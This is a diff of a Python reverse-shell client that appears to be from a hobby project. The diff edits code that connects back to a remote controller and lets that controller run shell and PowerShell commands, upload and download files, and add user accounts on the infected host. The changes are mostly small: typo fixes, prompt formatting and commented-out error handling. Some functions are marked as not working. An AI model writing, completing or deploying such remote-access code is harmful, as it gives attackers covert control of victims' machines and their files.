@@ -1,4 +1,5 @@
 # Basic Reverse Shell - Client Side #
+
 import getpass
 import platform
 import socket
@@ -43,9 +44,9 @@ def reverse_shell():
             cli = f"{username}:{cwd}#"
             s.send(cli.encode(FORMAT))
         else:
-            cli = f"{username}:{cwd}$"
+            cli = f"{cwd}$"
             s.send(cli.encode(FORMAT))
-            
+        # try:
         output = s.recv(BUF_SIZE).decode(FORMAT)
         output_split = output.split(" ")
         if "exit" == output:
@@ -84,7 +85,7 @@ def reverse_shell():
         elif "start" == output_split[0].lower() and ("/" not in output or "/" in output):
             start_file(output_split, OS)
             continue
-        elif "help5" == output_split[0].lower() or "help5" in output.lower():
+        elif "help" == output_split[0].lower() or "help" in output.lower():
             continue
         elif "ifconfig" == output_split[0].lower() or "ifconfig" in output.lower():
             ifconfig(OS)
@@ -117,8 +118,20 @@ def reverse_shell():
         else:
             other_command(output)
             continue
+    # except AttributeError as i:
+    #     s.send(f"wrong options, Error: {i}".encode('utf-8'))
+    #     continue
+    # except Exception as e:
+    #     s.send(f"the problem is : {e}".encode('utf-8'))
+    #     continue
+    # except BrokenPipeError as d:
+    #     s.send(f"wrong options, Error: {d}".encode('utf-8'))
+    #     continue
+    # except KeyboardInterrupt as o:
+    #     s.send(f"wrong options, Error: {o}".encode('utf-8'))
+    #     continue
 
-            
+
 def powershell(OS, output):
     output = output.split("powershell ")
     message = os.system(f'powershell -Command "{output}"')
@@ -173,7 +186,7 @@ def cd_empty(OS):
 
 def upload(output):
     # We can send file sample.txt
-    command1 = outputp[1]
+    command1 = output[1]
     file = open(fr"{output}", "rb")
     SendData = file.read(1024)
 
@@ -187,7 +200,7 @@ def upload(output):
 
 
 def down_file(output):
-    # in progress
+    # need to check
     filename = output[1]
     with open(fr'{filename}', 'wb') as file_to_write:
         while True:
@@ -222,7 +235,7 @@ def cd_dot(OS):
 
 
 def add_user():
-    # in progress
+    # need to check
     username = input("Enter Username ")
     password = getpass.getpass()
     print(password)
@@ -231,6 +244,20 @@ def add_user():
         s.send(f"User added: {username}".encode(FORMAT))
     except:
         s.send(f"Failed to add user: {username}".encode(FORMAT))
+
+
+# def chmod():
+#     a = chmo
+#     b =
+#     c =
+#     d =
+#     e =
+#     f=
+#     os.chmod()
+# def chown():
+#     # not working yet
+#     os.chown()
+#     pass
 
 
 def ls_empty(cwd):
@@ -304,15 +331,15 @@ def touch_path(output):
 
 
 def touch_file(output_split):
-    # in progress
+    # not working
     path = output_split[1]
     with open(fr'{path}', "w") as file:
         file.write("")
     s.send(f"Created a file: {path}")
-    pass
+
 
 def start_file(output_split, OS):
-    # in progress
+    # not working
     try:
         path = output_split[1]
         if "Windows" in OS:
